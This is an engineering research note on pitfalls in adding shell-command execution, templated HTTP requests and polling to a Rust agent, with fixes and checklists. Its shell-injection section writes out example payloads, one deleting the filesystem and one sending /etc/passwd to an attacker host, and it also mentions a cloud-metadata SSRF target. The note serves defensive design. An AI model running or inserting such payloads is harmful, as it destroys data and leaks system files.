# Pitfalls Research

**Domain:** Adding configurable CLI execution, templated HTTP clients, and async polling to existing Rust runner agent
**Researched:** 2026-03-24
**Confidence:** HIGH

## Critical Pitfalls

### Pitfall 1: Zombie Processes from Dropped `tokio::process::Child` Handles

**What goes wrong:**
The agent spawns a CLI process via `tokio::process::Command`, but the task is cancelled (gateway timeout, SIGTERM, stream disconnect) before the child process exits. The `Child` handle is dropped. By default, Tokio does NOT kill the child on drop -- the process keeps running as an orphan. Over time, zombie processes accumulate, consuming PIDs and system resources. On a long-running agent processing hundreds of CLI tasks, this eventually exhausts the PID limit and no new processes can be spawned.

**Why it happens:**
Tokio's default behavior is to let child processes outlive their handles for backwards compatibility. Developers coming from Go or Python expect child processes to be cleaned up automatically. The `kill_on_drop(true)` method exists but is not the default, and many developers never discover it. Additionally, even with `kill_on_drop`, the SIGKILL sent on drop does not reap the zombie -- the tokio runtime reaps on a "best-effort" basis which may not be immediate.

**How to avoid:**
1. Always set `kill_on_drop(true)` on every `Command` that the agent spawns:
   ```rust
   let mut child = tokio::process::Command::new(&cmd)
       .args(&args)
       .kill_on_drop(true)
       .spawn()?;
   ```
2. Always `child.wait().await` after the process completes to reap the zombie immediately rather than relying on Tokio's background reaper.
3. Wrap every child process execution in `tokio::time::timeout()` so the agent never waits indefinitely for a hung CLI tool. On timeout, explicitly call `child.kill().await` then `child.wait().await` to ensure clean reaping.
4. Track spawned processes in the agent's state so the graceful drain handler (already exists for SIGTERM) can kill and reap all outstanding children.

**Warning signs:**
- `ps aux | grep defunct` shows zombie processes on the host
- Agent log shows task timeouts but `ps` shows the CLI process still running
- PID exhaustion errors (`Resource temporarily unavailable`) after extended runtime
- No `kill_on_drop(true)` in any `Command::new()` call

**Phase to address:**
Phase 1 (CLI Execution Mode). Must be baked into the process spawning abstraction from the first implementation.

---

### Pitfall 2: stdin/stdout Pipe Deadlock in CLI Stdin-Pipe Mode

**What goes wrong:**
The agent's `stdin-pipe` execution mode writes the task payload to the child's stdin while also trying to read stdout/stderr. If the payload is larger than the OS pipe buffer (typically 64KB on Linux), the write to stdin blocks because the pipe buffer is full. The child process is trying to write to stdout, but its stdout pipe buffer is also full because the agent is blocked writing to stdin -- not reading stdout. Both sides are blocked waiting on each other: classic deadlock. The task hangs forever (or until the agent's timeout fires).

**Why it happens:**
This is a fundamental UNIX pipe buffering issue that catches even experienced developers. The pipe buffer on Linux is 65,536 bytes. If the child process reads some input, processes it, and writes output before reading the rest of its input, the interleaved read/write pattern creates a circular dependency. The `std::process::Command` documentation warns about this, and `tokio::process` has the same issue. Developers test with small payloads (< 64KB) where it works, then deploy with real payloads where it deadlocks.

**How to avoid:**
1. Write stdin and read stdout/stderr concurrently. In async Rust, this means driving them in separate concurrent branches:
   ```rust
   let mut child = Command::new(&cmd)
       .stdin(Stdio::piped())
       .stdout(Stdio::piped())
       .stderr(Stdio::piped())
       .kill_on_drop(true)
       .spawn()?;

   let mut stdin = child.stdin.take().unwrap();
   let mut stdout = child.stdout.take().unwrap();
   let mut stderr = child.stderr.take().unwrap();

   let (write_result, stdout_bytes, stderr_bytes) = tokio::join!(
       async { stdin.write_all(&payload).await.and_then(|_| { drop(stdin); Ok(()) }) },
       async { let mut buf = Vec::new(); stdout.read_to_end(&mut buf).await.map(|_| buf) },
       async { let mut buf = Vec::new(); stderr.read_to_end(&mut buf).await.map(|_| buf) },
   );
   ```
2. Always close stdin after writing (drop the handle) so the child process receives EOF and can finish processing.
3. Never use `child.wait_with_output()` after writing large payloads to stdin -- it reads stdout/stderr only after stdin is closed, but if stdin was never taken and closed, the pipe stays open.
4. Set a memory limit on stdout/stderr reads to prevent a malicious or buggy CLI tool from filling the agent's memory with unbounded output.

**Warning signs:**
- CLI tasks hang indefinitely with large payloads but work fine with small ones
- The 64KB threshold is suspiciously close to when tasks start hanging
- `child.wait_with_output()` used after piping to stdin
- No `tokio::join!` or equivalent concurrent I/O pattern

**Phase to address:**
Phase 1 (CLI Execution Mode). The stdin-pipe path must use concurrent I/O from the start. This is not something to fix later -- the architecture of the pipe handling function must be correct.

---

### Pitfall 3: Shell Injection via `sh -c` with Unsanitized Placeholders

**What goes wrong:**
The placeholder system substitutes `<payload>` into a command template. If the developer uses `sh -c "process <payload>"` as the command template, and the payload contains shell metacharacters (backticks, `$()`, `;`, `|`, `&&`), the shell interprets them. A payload like `; rm -rf /` or `$(curl attacker.com/exfil?data=$(cat /etc/passwd))` becomes a remote code execution vulnerability. Even if the agent is trusted, untrusted task payloads flow through it.

**Why it happens:**
Rust's `std::process::Command` is safe by default -- it passes arguments directly to the exec syscall without shell interpretation. But the moment you use `sh -c` (or `/bin/bash -c`) to run a shell command string, all safety is lost. The placeholder system naturally encourages string interpolation into command strings, which is exactly the dangerous pattern. Developers test with clean payloads and never think about adversarial input.

**How to avoid:**
1. **Strongly prefer the arg-based execution mode** where the command and arguments are separate. `Command::new("process").arg(&payload)` is immune to shell injection because no shell is involved.
2. **Never use `sh -c` with interpolated user data.** If a shell is genuinely needed (pipes, redirects in the command template), pass the payload via stdin or environment variable, never as part of the shell command string.
3. If argument-level placeholder substitution is needed, use `Command::new(program).arg(replaced_arg)` -- each arg is a separate OS-level argument, not parsed by a shell.
4. For the stdin-pipe mode, the payload goes through stdin, which is inherently safe from shell injection.
5. Document that `<payload>` in command args is safe (passed as literal arg), but `<payload>` in a shell string is dangerous. Consider rejecting shell-mode commands that contain `<payload>` directly in the command string -- force users to use stdin-pipe or env var injection instead.
6. If env var interpolation is supported (e.g., `$API_KEY` in headers), use a whitelist of allowed env vars. Never expose the full process environment.

**Warning signs:**
- Any `Command::new("sh").arg("-c").arg(format!("... {} ...", payload))`
- Placeholder replacement happening on the full command string before splitting into program + args
- No distinction between "command template" and "argument template" in the config schema
- No input validation or escaping documentation

**Phase to address:**
Phase 1 (CLI Execution Mode). The execution abstraction must enforce the safe pattern architecturally -- make the unsafe pattern impossible, not just discouraged.

---

### Pitfall 4: Async Polling Loop Without Jitter Causes Thundering Herd

**What goes wrong:**
The `async-api` mode submits a task to an external API, then polls for completion. If the poll interval is fixed (e.g., every 2 seconds), and the agent is handling many concurrent async tasks against the same API, all poll requests align on the same interval. The external API receives bursts of requests every 2 seconds with idle gaps in between. Under load, this thundering herd pattern causes request timeouts, 429 rate limit responses, and cascading failures.

**Why it happens:**
Fixed-interval polling is the obvious implementation. Developers set `poll_interval: 2s` in the config and use `tokio::time::interval(Duration::from_secs(2))`. All tasks started around the same time poll at the same cadence. Even tasks started at different times can align over time because `interval` ticks are absolute, not relative to the last response. The thundering herd only manifests under concurrent load, so it passes single-task testing.

**How to avoid:**
1. Add random jitter to every poll interval: `base_interval + rand::random::<u64>() % jitter_window`.
2. Use exponential backoff on the poll interval -- start fast (500ms), increase to the configured maximum. Most async APIs complete quickly, so the first few polls should be frequent.
3. Use `tokio::time::sleep()` (relative delay after each poll response) instead of `tokio::time::interval()` (absolute ticks). Sleep-based polling naturally spaces out because it accounts for the time spent waiting for the API response.
4. Respect `Retry-After` headers from the external API -- if the API says "try again in 30s," honor it.
5. Set a maximum concurrent polls per external API host to prevent overwhelming a single endpoint.
6. Cap total poll duration with a timeout so a broken external API doesn't cause polls to run forever.

**Warning signs:**
- `tokio::time::interval()` used for polling (instead of `sleep()`)
- No jitter in poll timing
- External API returning 429 or timeout errors under load
- All poll requests hitting the same millisecond in access logs
- No `max_poll_duration` or equivalent timeout in config

**Phase to address:**
Phase 3 (Async-API Mode). Must be designed into the polling implementation, not bolted on after load testing reveals the problem.

---

### Pitfall 5: Reqwest Client Per-Request Instead of Shared Client

**What goes wrong:**
The `sync-api` and `async-api` modes create a new `reqwest::Client` for each HTTP request. Each client creates a new connection pool, new TLS session, new DNS resolution. Under load, this exhausts file descriptors (each TLS connection is a socket), causes TLS handshake storms, and dramatically increases latency. The agent already has a shared `reqwest::Client` for the current hardcoded HTTP dispatch -- but the new configurable execution engine might create per-request clients if not careful.

**Why it happens:**
When building templated requests, it is tempting to construct a new client with per-request configuration (custom timeouts, custom headers). `reqwest::Client::builder()` makes it easy. The performance impact is invisible with single-digit concurrent tasks but devastating at scale.

**How to avoid:**
1. Create one `reqwest::Client` at agent startup (as the current code already does) and reuse it for all HTTP execution modes.
2. Per-request configuration (headers, timeout) should be set on the `RequestBuilder`, not the `Client`. The client owns the connection pool; the request builder owns the per-request settings.
3. If different services need different TLS configurations (e.g., custom CA certs), create one client per unique TLS config at config load time, not per request.
4. Set sensible defaults on the shared client: `timeout(Duration::from_secs(30))`, `pool_max_idle_per_host(10)`, `pool_idle_timeout(Duration::from_secs(90))`.

**Warning signs:**
- `reqwest::Client::new()` or `Client::builder().build()` inside a request handler or loop
- File descriptor exhaustion errors (`Too many open files`)
- High latency on HTTP calls despite the target API being fast
- TLS handshake errors under load

**Phase to address:**
Phase 2 (Sync-API Mode). The shared client pattern must be established when HTTP execution is first implemented.

---

### Pitfall 6: Placeholder Injection in URLs Creates Malformed Requests or SSRF

**What goes wrong:**
The `sync-api` and `async-api` config templates allow placeholders in URLs, headers, and bodies (e.g., `url: "https://api.example.com/process/<task_id>"`). If a placeholder value contains URL-special characters (`/`, `?`, `#`, `%`), the resulting URL is malformed. Worse, if the URL template puts a placeholder in the hostname portion (`url: "https://<host>/api"`), an attacker-controlled metadata value could redirect the request to an internal service (SSRF). For example, a task with metadata `host: "169.254.169.254"` would hit the cloud metadata endpoint.

**Why it happens:**
String interpolation in URLs feels natural -- it is how most template systems work. Developers URL-encode values in query parameters but forget that path segments and hostnames also need encoding. The SSRF risk is subtle because the agent config is trusted, but task metadata/payload values are not.

**How to avoid:**
1. URL-encode placeholder values when substituting into URL path segments. Use `urlencoding::encode()` or `percent_encoding` crate.
2. Never allow placeholder substitution in the URL scheme or hostname. Parse the URL after substitution and verify the hostname matches the original template's hostname.
3. For body templates, no encoding is needed (the body is opaque bytes). For header values, reject values containing `\r\n` (HTTP header injection).
4. Validate the final constructed URL with `url::Url::parse()` -- reject malformed URLs before sending.
5. Consider an allowlist of hostnames the agent is permitted to contact. Log warnings if a templated URL resolves to a private IP range.
6. Configure `reqwest` with `redirect(Policy::none())` to prevent open redirect chains from reaching internal services.

**Warning signs:**
- Raw string replacement (`url.replace("<task_id>", &task_id)`) without URL encoding
- Placeholders in the hostname portion of URL templates
- No URL validation after placeholder substitution
- No redirect policy configured on the HTTP client
- Task metadata values containing `/` or `?` causing 404s on the target API

**Phase to address:**
Phase 2 (Sync-API Mode). URL construction must be safe from the first HTTP request.

---

### Pitfall 7: TOML Config Errors Surface as Cryptic Serde Messages

**What goes wrong:**
An operator writes `agent.toml` with a misconfigured service. Serde deserialization fails with a message like `missing field 'poll_url' in table 'services.my-service'` or worse, `invalid type: string "5", expected u64 at line 42 column 12`. The operator has no idea what field is wrong, what valid values look like, or how to fix it. They spend 30 minutes guessing.

**Why it happens:**
Serde's error messages are designed for developers, not operators. They reference Rust type system concepts ("expected u64") instead of domain concepts ("expected a number of seconds"). Complex nested config (services with execution modes, each with different required fields) makes errors worse because the serde path (`services.my-service.async_api.poll_interval`) may not match the operator's mental model. Additionally, serde validates structure but not semantics -- a `poll_interval: 0` parses fine but is nonsensical.

**How to avoid:**
1. Implement a `validate()` method on the config struct that runs after deserialization. Check semantic constraints: poll intervals > 0, URLs are valid, command paths exist, timeout > poll_interval, etc.
2. Use `#[serde(deny_unknown_fields)]` on config structs to catch typos in field names. Without it, `polll_interval` (triple-l) silently falls back to the default.
3. Wrap the TOML parsing in a function that catches serde errors and re-formats them with context:
   ```rust
   match toml::from_str::<AgentConfig>(&contents) {
       Ok(config) => config.validate()?,
       Err(e) => {
           eprintln!("Configuration error in {}:\n  {}\n\nSee docs/agent-config.md for valid configuration.", path, e);
           std::process::exit(1);
       }
   }
   ```
4. Use `#[serde(default)]` judiciously -- provide defaults for optional fields but require explicit values for critical fields (command, URL). Do not default a URL to `""` and then fail at request time.
5. Provide an example `agent.toml` with comments explaining every field. Ship it alongside the binary.
6. Consider using the `figment` or `config` crate for layered config (file + env vars + CLI args) with better error reporting than raw `toml::from_str`.

**Warning signs:**
- Users opening issues about config errors they cannot decipher
- No `validate()` call after deserialization
- No `deny_unknown_fields` on any config struct
- Default values for fields that should be required (URLs, commands)
- No example config file in the repository

**Phase to address:**
Phase 1 (Config Schema). The config struct and validation must be the first thing built -- every other feature depends on reading config correctly.

---

### Pitfall 8: Blocking `Command::spawn()` on the Tokio Runtime Thread

**What goes wrong:**
`tokio::process::Command::spawn()` calls `fork()` + `exec()` under the hood. The `fork()` syscall is synchronous and can be slow on processes with large memory maps. If the agent's Tokio runtime has only a few worker threads (the default is one thread per CPU core), and multiple CLI tasks call `spawn()` concurrently, the runtime threads are blocked during the fork, starving all other async tasks -- including the gRPC poll loop. The agent stops responding to the gateway, which marks it as unhealthy.

**Why it happens:**
Developers assume `tokio::process::Command` is "fully async" because it is in the `tokio::process` module. The async part is waiting for the process to exit and reading its output. The actual process creation (`fork()`) is synchronous. On a system with many mapped pages (common in containers with large working sets), `fork()` can take tens of milliseconds. With the default Tokio runtime (e.g., 4 threads on a 4-core machine), 4 concurrent spawns can stall the entire runtime for that duration.

**How to avoid:**
1. Limit concurrent CLI executions. The agent should process one task at a time per its current design (sequential task processing within the gRPC stream). If parallel execution is added later, use a `tokio::sync::Semaphore` to cap concurrent spawns.
2. Consider using `tokio::task::spawn_blocking()` to move the `spawn()` call off the async runtime threads if concurrent task processing is implemented.
3. Monitor the time spent in `spawn()` with tracing spans. Log a warning if spawn takes > 10ms.
4. Keep the agent process memory footprint small. Avoid memory-mapping large files or loading large configs into memory, as this makes `fork()` slower.

**Warning signs:**
- Gateway marks the agent's node as stale/unhealthy during CLI task execution
- gRPC heartbeat (poll loop) stops responding during process spawning
- High spawn latency visible in tracing spans
- Multiple concurrent `Command::spawn()` calls without semaphore limiting

**Phase to address:**
Phase 1 (CLI Execution Mode). The sequential processing model of the existing agent naturally limits this, but the spawn must still be monitored and the limitation documented for future parallel execution work.

---

### Pitfall 9: Async-API Poll Loop Leaks Resources on Task Cancellation

**What goes wrong:**
The agent submits a job to an external async API and starts polling for completion. Meanwhile, the gateway cancels the task (timeout, client cancellation) or the agent receives SIGTERM. The poll loop does not learn about the cancellation and continues polling the external API indefinitely. The external job also continues running, wasting compute. If the agent restarts, the poll state is lost -- the external job is now orphaned with no one polling for its result.

**Why it happens:**
The poll loop runs as a `tokio::spawn`'d task that is decoupled from the gRPC stream. There is no built-in mechanism for the gateway to cancel a specific task in the agent (the current protocol has no cancel-task-on-node RPC). The developer forgets to wire the poll loop's cancellation to the agent's shutdown signal. Also, poll state is entirely in-memory -- if the agent crashes, all knowledge of pending external jobs is lost.

**How to avoid:**
1. Use a `CancellationToken` (from `tokio_util`) for each async-API task. Pass it to the poll loop. Check it on every poll iteration.
2. Wire the agent's SIGTERM handler to cancel all outstanding `CancellationToken`s. The existing `in_flight_done` Notify pattern needs to be extended to support multiple concurrent async tasks.
3. On cancellation, attempt to cancel the job on the external API if the API supports it (e.g., `DELETE /jobs/{id}`). Document this as a `cancel_url` in the config.
4. Set a hard `max_poll_duration` in the config. Even if the external API never returns "done," the poll loop must eventually give up and report failure to the gateway.
5. Persist pending async job IDs to Redis (the gateway already uses Redis). On agent restart, resume polling for previously submitted jobs. This is a significant feature but prevents orphaned external jobs.
6. Report the external job's ID back to the gateway as part of the "task running" status so operators can manually clean up orphaned jobs.

**Warning signs:**
- No cancellation mechanism wired between the gRPC stream and poll loops
- No `max_poll_duration` timeout on the poll loop
- Agent shutdown does not wait for or cancel poll loops
- No logging when a poll loop is cancelled or times out
- External API jobs running after the agent has moved on

**Phase to address:**
Phase 3 (Async-API Mode). Cancellation must be designed into the poll loop from the start, not added retroactively.

---

### Pitfall 10: Execution Mode Config Enum Validated at Deserialize but Not at Runtime

**What goes wrong:**
The agent.toml defines execution modes (`cli`, `sync-api`, `async-api`) per service. Serde validates that the mode string is one of the expected variants. But the runtime code matches on the enum and has a catch-all arm that silently does nothing, or the `async-api` mode requires `poll_url` and `submit_url` fields that are `Option<String>` and not validated as present when `mode = "async-api"`. The agent starts, accepts a task, and panics (or silently drops the task) because required fields for the execution mode are missing.

**Why it happens:**
Serde's `#[serde(tag = "mode")]` adjacently-tagged enum pattern is elegant but requires discipline. If execution mode config is a flat struct with all fields optional, serde happily parses a CLI-mode service with no `command` field. The developer relies on runtime `unwrap()` calls to catch missing fields, which panic in production. Alternatively, the developer uses a tagged enum but forgets to add a new variant's required fields, and serde defaults them to `None`.

**How to avoid:**
1. Use Rust's type system to enforce mode-specific required fields. Model execution modes as a tagged enum where each variant contains only its required fields:
   ```rust
   #[serde(tag = "mode")]
   enum ExecutionMode {
       #[serde(rename = "cli")]
       Cli { command: String, args: Vec<String> },
       #[serde(rename = "sync-api")]
       SyncApi { url: String, method: String },
       #[serde(rename = "async-api")]
       AsyncApi { submit_url: String, poll_url: String, poll_interval_secs: u64 },
   }
   ```
2. This way, `mode = "async-api"` without `poll_url` is a serde error at config load, not a runtime panic.
3. Add a `validate()` method on each variant to check semantic correctness (URL is valid, command exists on PATH, poll_interval > 0).
4. Never use `Option<T>` for fields that are required within a specific mode. If it's required, make it non-optional in that variant's struct.

**Warning signs:**
- Flat config struct with `mode: String` and all fields as `Option<T>`
- `unwrap()` calls on config fields in request handlers
- Agent accepts tasks but panics or silently drops them for certain modes
- No integration test that loads each execution mode's config and runs a task

**Phase to address:**
Phase 1 (Config Schema). The enum modeling decision affects every subsequent phase.

---

## Technical Debt Patterns

| Shortcut | Immediate Benefit | Long-term Cost | When Acceptable |
|----------|-------------------|----------------|-----------------|
| Flat config struct with all `Option` fields instead of tagged enum | Faster initial serde setup | Runtime panics from missing fields, every handler needs None checks | Never -- tagged enum takes 30 minutes and prevents entire class of bugs |
| `String::replace()` for placeholder substitution | Simple, no dependencies | No escaping, no validation, can't distinguish placeholders from literal text | Never for URLs/headers. Acceptable for opaque body templates only |
| No concurrent I/O for stdin/stdout pipes | Simpler code, works for small payloads | Deadlock on payloads > 64KB, silent hang in production | Never -- the concurrent pattern is the correct pattern |
| Per-request `reqwest::Client` | Avoids sharing state between execution modes | FD exhaustion, TLS handshake storms, high latency under load | Never -- share the client, customize the request |
| In-memory poll state only (no persistence) | Simpler, no Redis integration for agent | Orphaned external jobs on crash/restart, wasted compute | Acceptable for MVP if max_poll_duration is short (< 5 min) and operators can manually check external APIs |
| Hardcoded poll interval without jitter | Simpler timer logic | Thundering herd under concurrent async tasks against same API | Only if the agent processes tasks strictly sequentially (one at a time) |

## Integration Gotchas

| Integration | Common Mistake | Correct Approach |
|-------------|----------------|------------------|
| CLI spawn + existing gRPC poll loop | Spawning process on the async runtime thread, blocking gRPC heartbeats | Sequential processing (current design) naturally limits this. If adding parallel execution, use `Semaphore` and consider `spawn_blocking` for the fork |
| `tokio::process::Command` + timeout | Using `child.wait_with_output()` with `tokio::time::timeout()` but forgetting to kill the process on timeout | On timeout: `child.kill().await` then `child.wait().await`. The process is still running until killed |
| Reqwest + templated headers | Injecting values containing `\r\n` into headers, enabling HTTP header injection | Validate header values reject control characters. Use `reqwest::header::HeaderValue::from_str()` which rejects invalid characters |
| Reqwest + redirect following | External API redirects to internal IP (SSRF via open redirect) | `Client::builder().redirect(Policy::none())` -- handle redirects explicitly if needed |
| Agent SIGTERM + spawned processes | SIGTERM handler drains gRPC but does not kill/wait spawned CLI processes | Extend the existing graceful drain to track and clean up all child processes |
| TOML `#[serde(tag = "mode")]` + unknown fields | Extra fields in wrong mode silently accepted. e.g., `cli` mode with `poll_url` field -- no error, but misleading | Use `#[serde(deny_unknown_fields)]` on each variant struct to catch config mistakes |
| Env var interpolation in config | Using `std::env::var()` at request time -- fails if env var unset | Resolve env vars at config load time. Fail fast with clear error if env var is missing |

## Performance Traps

| Trap | Symptoms | Prevention | When It Breaks |
|------|----------|------------|----------------|
| New `reqwest::Client` per HTTP request | Slow HTTP calls, FD exhaustion, TLS handshake errors | Single shared client, per-request `RequestBuilder` config | > 10 concurrent HTTP tasks |
| Unbounded stdout/stderr buffering from CLI processes | Agent OOM killed by OS | Cap read buffer size (e.g., 10MB). Truncate and log warning if exceeded | CLI tool produces > available RAM of output |
| Fixed poll interval without jitter or backoff | External API rate-limits or times out, 429 errors | Jitter + exponential backoff + Retry-After header respect | > 5 concurrent async-API tasks against same host |
| `fork()` blocking runtime threads | gRPC heartbeats stall, gateway marks node unhealthy | Sequential task processing (existing design). Semaphore if parallel added | > CPU-core-count concurrent CLI spawns |
| TOML config parsed on every task (not cached) | Unnecessary allocations and file I/O per task | Parse config once at startup, store in Arc | > 100 tasks/minute |

## Security Mistakes

| Mistake | Risk | Prevention |
|---------|------|------------|
| Shell injection via `sh -c` with payload interpolation | Remote code execution via crafted task payloads | Never interpolate untrusted data into shell command strings. Use arg-based execution or stdin pipe |
| Placeholder substitution in URL hostname | SSRF to internal services (cloud metadata, internal APIs) | Validate post-substitution URL hostname matches template hostname. Block private IP ranges |
| Full environment exposed to child processes | Leaking secrets (XGENT_NODE_TOKEN, API keys) to arbitrary CLI tools | Use `Command::env_clear()` then explicitly set only needed env vars. Never pass the agent's auth token to child processes |
| Env var names in config used as-is without validation | Config `env: "$SOME_VAR"` could reference sensitive vars | Whitelist allowed env vars or use a dedicated `[env]` section in config. Never allow `$XGENT_NODE_TOKEN` in templates |
| No output size limit on CLI execution | Denial of service -- malicious CLI tool outputs gigabytes, agent OOM | Cap stdout + stderr at configurable max (default 10MB). Kill process if limit exceeded |
| HTTP header injection via placeholder in header values | Attacker can inject arbitrary headers including auth headers | Validate header values contain no `\r\n`. Use `HeaderValue::from_str()` which rejects control chars |

## UX Pitfalls

| Pitfall | User Impact | Better Approach |
|---------|-------------|-----------------|
| Cryptic serde errors for config mistakes | Operator spends 30 minutes debugging TOML syntax | Catch serde errors and format with file path, field path, and link to example config |
| Silent fallback to default values for critical fields | Agent starts but tasks fail at runtime with confusing errors | Required fields must not have defaults. Fail at startup, not at first task |
| No config validation at startup | Agent boots, connects to gateway, accepts task, then crashes | Run full validation (URL parsing, command existence check, poll_interval > 0) at startup before connecting |
| No dry-run or config-check mode | Operator deploys config change and learns it is broken only after agent restarts | Add `--check-config` flag that parses, validates, and exits 0/1 without connecting |
| Error messages do not include which service failed | Multi-service agent reports "command not found" with no service context | Include service name in every log line and error message |

## "Looks Done But Isn't" Checklist

- [ ] **CLI kill_on_drop:** Often missing -- verify `kill_on_drop(true)` is set on every `Command::new()` call
- [ ] **CLI timeout:** Often missing -- verify every child process execution is wrapped in `tokio::time::timeout()`
- [ ] **Stdin pipe:** Often deadlocking -- verify stdin write and stdout/stderr read happen concurrently with `tokio::join!` or equivalent
- [ ] **Stdin close:** Often forgotten -- verify stdin handle is dropped after writing so child receives EOF
- [ ] **URL encoding:** Often skipped -- verify placeholder values in URL paths are percent-encoded
- [ ] **Header validation:** Often skipped -- verify header values reject control characters (`\r`, `\n`)
- [ ] **Poll jitter:** Often missing -- verify async-API poll intervals include randomized jitter
- [ ] **Poll timeout:** Often missing -- verify `max_poll_duration` is enforced and poll loop gives up
- [ ] **Config deny_unknown_fields:** Often missing -- verify typo'd field names produce errors, not silent acceptance
- [ ] **Config validate():** Often missing -- verify semantic validation runs after deserialization (URLs valid, intervals > 0, commands exist)
- [ ] **Env var resolution at startup:** Often deferred -- verify missing env vars fail at config load, not at first request
- [ ] **Graceful shutdown of CLI processes:** Often forgotten -- verify SIGTERM kills spawned child processes and waits for them
- [ ] **Shared reqwest client:** Often duplicated -- verify no `Client::new()` or `Client::builder().build()` inside task handlers
- [ ] **Output size cap:** Often missing -- verify stdout/stderr reads are bounded to prevent OOM

## Recovery Strategies

| Pitfall | Recovery Cost | Recovery Steps |
|---------|---------------|----------------|
| Zombie processes | LOW | Add `kill_on_drop(true)` to Command builder. Restart agent to reap existing zombies. One-line fix |
| Stdin/stdout deadlock | MEDIUM | Refactor pipe handling to use `tokio::join!` for concurrent I/O. Requires restructuring the dispatch function. Test with payloads > 64KB |
| Shell injection in command templates | HIGH | Audit all existing service configs for `sh -c` usage. Refactor to arg-based execution or stdin pipe. May require changing deployed service configurations |
| Thundering herd from polling | LOW | Add jitter to poll interval calculation. One mathematical change, no API redesign |
| Per-request reqwest::Client | LOW | Move Client construction to startup, pass shared reference. Small refactor |
| SSRF via URL placeholders | MEDIUM | Add URL validation after substitution. Add hostname allowlist. Requires config schema change if adding allowlist |
| Cryptic config errors | LOW | Wrap toml parsing with formatted error output. Add `validate()`. No architectural change |
| Missing config fields panic at runtime | MEDIUM | Refactor to tagged enum. May require config file format change for existing deployments. Provide migration guide |
| Orphaned external API jobs | HIGH | Requires persistent poll state (Redis), resume-on-restart logic, and cancel-on-abort RPC to external APIs. Significant feature work |

## Pitfall-to-Phase Mapping

| Pitfall | Prevention Phase | Verification |
|---------|------------------|--------------|
| Zombie processes | Phase 1 (CLI Mode) | Run CLI task, cancel mid-execution, verify no zombie processes with `ps` |
| Stdin/stdout deadlock | Phase 1 (CLI Mode) | Test with 100KB+ payload via stdin-pipe mode, verify task completes without hanging |
| Shell injection | Phase 1 (CLI Mode) | Verify `Command::new()` is used with `.arg()`, never `sh -c` with interpolated payload |
| Config schema with tagged enum | Phase 1 (Config Schema) | Remove a required field from config, verify agent refuses to start with clear error |
| Config validation | Phase 1 (Config Schema) | Set `poll_interval: 0`, verify agent refuses to start. Set `url: "not-a-url"`, verify rejection |
| Shared reqwest client | Phase 2 (Sync-API Mode) | Grep for `Client::new()` outside of startup -- must return zero results |
| URL placeholder encoding | Phase 2 (Sync-API Mode) | Submit task with ID containing `/` and `?`, verify target API receives correctly encoded URL |
| Header injection | Phase 2 (Sync-API Mode) | Verify `HeaderValue::from_str()` is used for all templated header values |
| Poll jitter and timeout | Phase 3 (Async-API Mode) | Run 10 concurrent async tasks, verify poll times are not aligned in logs. Verify poll loop terminates after max_poll_duration |
| Poll loop cancellation | Phase 3 (Async-API Mode) | Start async task, send SIGTERM, verify poll loop stops and external job cancellation is attempted |
| Env var resolution | Phase 1 (Config Schema) | Reference undefined env var in config, verify agent fails at startup with message naming the missing var |
| Blocking fork on runtime | Phase 1 (CLI Mode) | Monitor gRPC heartbeat during CLI task execution, verify no stale-node detection on gateway |
| Output size cap | Phase 1 (CLI Mode) | Run CLI tool that outputs 20MB, verify agent caps output and does not OOM |

## Sources

- [tokio::process documentation](https://docs.rs/tokio/latest/tokio/process/) - kill_on_drop behavior, zombie process reaping
- [tokio::process::Command leaves zombies when child future is dropped](https://github.com/tokio-rs/tokio/issues/2685) - zombie process issue discussion
- [std::process::Command hangs if piped stdout buffer fills](https://github.com/rust-lang/rust/issues/45572) - pipe deadlock documentation
- [Deadlocking Linux subprocesses using pipes](https://tey.sh/TIL/002_subprocess_pipe_deadlocks) - pipe buffer deadlock explanation
- [Spawn process with timeout and capture output in tokio](https://users.rust-lang.org/t/spawn-process-with-timeout-and-capture-output-in-tokio/128305) - timeout patterns for child processes
- [CVE-2024-24576: Rust Command injection on Windows](https://github.com/rust-lang/rust/security/advisories/GHSA-q455-m56c-85mh) - shell escaping vulnerability
- [Stop Leaking Tasks in Rust: Tokio Patterns](https://ritik-chopra28.medium.com/stop-leaking-tasks-in-rust-the-tokio-patterns-senior-engineers-use-6eb2655f3b82) - async task leak prevention
- [Top 5 Tokio Runtime Mistakes](https://www.techbuddies.io/2026/03/21/top-5-tokio-runtime-mistakes-that-quietly-kill-your-async-rust/) - common Tokio anti-patterns
- [OWASP SSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html) - SSRF mitigation strategies
- [Gracefully clean up Child on drop instead of SIGKILL](https://github.com/tokio-rs/tokio/issues/2504) - process cleanup on drop behavior
- [Tokio + prctl = nasty bug](https://kobzol.github.io/rust/2025/02/23/tokio-plus-prctl-equals-nasty-bug.html) - Tokio process spawning edge cases

---
*Pitfalls research for: Adding configurable CLI execution, templated HTTP clients, and async polling to existing Rust runner agent*
*Researched: 2026-03-24*
